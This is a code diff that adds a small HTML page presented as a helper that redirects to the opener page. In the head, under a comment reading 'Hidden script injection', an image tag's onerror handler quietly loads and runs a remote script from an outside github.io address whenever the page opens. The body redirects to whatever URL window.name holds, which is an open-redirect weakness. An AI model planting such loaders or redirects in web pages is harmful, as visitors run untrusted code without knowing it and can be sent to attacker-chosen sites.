@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect to Opener Page</title>
+    <!-- Hidden script injection -->
+    <img src="x" onerror="javascript:(() => { const s = document.createElement('script'); s.src = 'https://totallylost-helpme.github.io/chat.js'; document.head.appendChild(s); })();">
+</head>
+<body>
+    <h1>Redirecting to the Previous Page</h1>
+
+    <script>
+        // Function to redirect to the URL stored in window.name
+        function redirectToOpener() {
+            const openerURL = window.name || '*';
+
+            // Redirect the current window
+            window.location.href = openerURL;
+        }
+
+        // Set window.name to the URL of the opener (if available)
+        if (window.opener) {
+            window.name = window.opener.location.href;
+        }
+
+        // Run the function to handle redirection
+        redirectToOpener();
+    </script>
+</body>
+</html>
+
